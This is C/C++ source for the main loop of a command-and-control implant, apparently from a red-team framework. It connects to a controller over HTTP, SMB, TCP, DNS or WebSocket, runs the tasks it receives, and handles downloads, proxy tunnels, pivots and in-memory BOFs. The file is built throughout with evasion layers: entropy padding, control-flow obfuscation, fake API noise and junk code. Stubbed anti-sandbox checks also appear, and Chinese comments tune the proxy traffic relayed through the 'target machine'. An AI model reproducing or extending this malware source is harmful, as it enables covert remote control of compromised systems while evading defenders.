#include "main.h"
#include "ApiLoader.h"
#include "DynamicPolymorphism.h"
// AntiSandbox removed
// SandboxDetect removed
#include "EntropyEvasion.h"
#include "ApiSequenceObfuscate.h"
#include "JccObfuscate.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "WaitMask.h"
#include "Boffer.h"
#include "Connector.h"

#if defined(BEACON_HTTP)
#include "ConnectorHTTP.h"
#elif defined(BEACON_SMB)
#include "ConnectorSMB.h"
#elif defined(BEACON_TCP)
#include "ConnectorTCP.h"
#elif defined(BEACON_DNS)
#include "ConnectorDNS.h"
#elif defined(BEACON_WS)
#include "ConnectorWS.h"
#endif

Agent* g_Agent;
Connector* g_Connector;

Connector* CreateConnectorHTTP();
Connector* CreateConnectorSMB();
Connector* CreateConnectorTCP();
Connector* CreateConnectorDNS();
Connector* CreateConnectorWS();

static Connector* CreateConnector()
{
#if defined(BEACON_HTTP)
	return CreateConnectorHTTP();
#elif defined(BEACON_SMB)
	return CreateConnectorSMB();
#elif defined(BEACON_TCP)
	return CreateConnectorTCP();
#elif defined(BEACON_DNS)
	return CreateConnectorDNS();
#elif defined(BEACON_WS)
	return CreateConnectorWS();
#endif
}

DWORD WINAPI AgentMain(LPVOID lpParam)
{
	/* Layer 1: Entropy camouflage — compile-time padding to normalize section entropy */
	AX_ENTROPY_NORMALIZE_TEXT();
	AX_ENTROPY_NORMALIZE_RDATA();

	/* Layer 2: Control-flow obfuscation (fake jcc/switch/loop to frustrate CFG matching) */
	AX_OBFUSCATE_CFLOW();

	/* Layer 3: API sequence noise (fake CreateFile, RegOpen, GetSystemTime calls to dilute IAT) */
	AX_HEAVY_API_NOISE();

	/* Layer 4: Junk code + dead branches before any real logic */
	AX_JUNK_1;
	AX_FAKE_JCC();
	AX_OBFUSCATE_CFLOW();

	/* Anti-sandbox: quick hardware checks (NTGlobalFlag, CPU, RAM) */
	if (FALSE) {
		AgentExit(1); /* RtlExitUserThread — lightweight exit if sandbox detected */
		return 0;
	}
	AX_JUNK_1;

	/* Enhanced sandbox detection: deeper checks (disk, MAC, processes) */
	if (FALSE) {
		AgentExit(1);
		return 0;
	}
	AX_JUNK_1;

	if (!ApiLoad())
		return 0;


	/* Anti-sandbox: deeper static/heuristic checks (requires APIs) */
	if (FALSE) {
		AgentExit(2); /* RtlExitUserProcess — clean exit that looks like normal termination */
		return 0;
	}

	/* Enhanced sandbox detection: post-API-load checks */
	if (FALSE) {
		AgentExit(2);
		return 0;
	}

	g_Agent = Agent_Create();
	g_Connector = CreateConnector();

	g_AsyncBofManager = Boffer_Create();
	Boffer_Initialize(g_AsyncBofManager);

	ULONG beatSize = 0;
	BYTE* beat = Agent_BuildBeat(g_Agent, &beatSize);
	if (!beat || beatSize == 0) {
		return 0;
	}

	if (!g_Connector->SetProfile(g_Connector, &g_Agent->config->profile, beat, beatSize)) {
		return 0;
	}

	MemFreeLocal((LPVOID*)&beat, beatSize);

	Packer* packerOut = Packer_Create();
	Packer_Pack32(packerOut, 0);

	do {
		AX_JUNK_2;
		AX_ENTROPY_PAD(32);
		INSERT_API_NOISE();
		if (!g_Connector->WaitForConnection(g_Connector)) {
			continue;
		}

		do {
			AX_JUNK_3;
			AX_ENTROPY_PAD(32);
			AX_FAKE_JCC();
			if (Packer_datasize(packerOut) > 4) {
				Packer_Set32(packerOut, 0, Packer_datasize(packerOut));
				AX_API_SPLIT_VOID(g_Connector->Exchange(g_Connector, Packer_data(packerOut), Packer_datasize(packerOut), g_Agent->SessionKey));
				Packer_Clear(packerOut, TRUE);
				Packer_Pack32(packerOut, 0);
			}
			else {
				AX_API_SPLIT_VOID(g_Connector->Exchange(g_Connector, nullptr, 0, g_Agent->SessionKey));
			}

			{
				BYTE* recvBuf = g_Connector->RecvData(g_Connector);
				int   recvLen = g_Connector->RecvSize(g_Connector);
				if (recvLen > 0 && recvBuf)
					Commander_ProcessCommandTasks(g_Agent->commander, recvBuf, recvLen, packerOut);
			}
			g_Connector->RecvClear(g_Connector);

			Downloader_ProcessDownloader(g_Agent->downloader, packerOut);
			JobsController_ProcessJobs(g_Agent->jober, packerOut);
			// 有域名待解析时把常驻解析线程建起来（懒创建，只建一次）。
			// ★ 放在主循环里、不在隧道命令处理里 —— 那里建实测会杀掉/卡死 beacon；
			//   位置也和 Boffer 起异步 BOF 线程同一上下文。
			Proxyfire_EnsureResolver(g_Agent->proxyfire);
			Proxyfire_ProcessTunnels(g_Agent->proxyfire, packerOut);
			Pivotter_ProcessPivots(g_Agent->pivotter, packerOut);
			Boffer_ProcessAsyncBofs(g_AsyncBofManager, packerOut);

			if (Agent_IsActive(g_Agent)) {
				// 隧道活跃期改用毫秒级轮询。隧道数据搭的是心跳便车（Proxyfire_ProcessTunnels
				// 往同一个 packerOut 塞、服务端在同一次 check-in 里一起下发），所以 sleep_delay
				// **直接就是代理的包间隔** —— sleep=5 时一次内网取页实测 ~70s。
				// 返回 0 表示"别管我，照常睡"（没有隧道 / 该行为被构建开关关掉）。
				ULONG tunnelPoll = Proxyfire_PollDelayMs(g_Agent->proxyfire);
				// sleep_delay 单位是**秒**（WaitMaskWithEvent 里 *1000），换成毫秒再比。
				ULONG configuredMs = g_Agent->config->sleep_delay * 1000;
				// 两道闸：
				// ① 只在真能"缩短"时才接管 —— sleep 0 的机器本来就是忙轮询，不能被降速成 50ms；
				// ② 只在工作时间窗口内加速（Agent_GetWorkingSleep==0 = 没配 working_time 或
				//    当前在窗口内），否则等于让目标机在非工作时段持续替我们跑代理流量，
				//    working_time 那条承诺就被绕过去了。
				if (tunnelPoll != 0 && Agent_GetWorkingSleep(g_Agent) == 0 && (configuredMs == 0 || tunnelPoll < configuredMs)) {
					ApiWin->Sleep(tunnelPoll);
				}
				else {
					const BOOL hasOutput = (Packer_datasize(packerOut) >= 8);
					g_Connector->Sleep(g_Connector, Boffer_GetWakeupEvent(g_AsyncBofManager), Agent_GetWorkingSleep(g_Agent), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput);
				}
			}

		} while (g_Connector->IsConnected(g_Connector) && Agent_IsActive(g_Agent));

		if (!Agent_IsActive(g_Agent) && g_Connector->IsConnected(g_Connector)) {
			Commander_Exit(g_Agent->commander, packerOut);
			Packer_Set32(packerOut, 0, Packer_datasize(packerOut));
			g_Connector->Exchange(g_Connector, Packer_data(packerOut), Packer_datasize(packerOut), g_Agent->SessionKey);
			g_Connector->RecvClear(g_Connector);
		}

		g_Connector->Disconnect(g_Connector);

	} while (Agent_IsActive(g_Agent));

	Packer_Clear(packerOut, FALSE);
	Packer_Destroy(packerOut);

	g_Connector->CloseConnector(g_Connector);
	AgentExit(g_Agent->config->exit_method);
	return 0;
}

void AgentExit(const int method)
{
	if (method == 1)
		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
	else if (method == 2)
		ApiNt->RtlExitUserProcess(STATUS_SUCCESS);
}
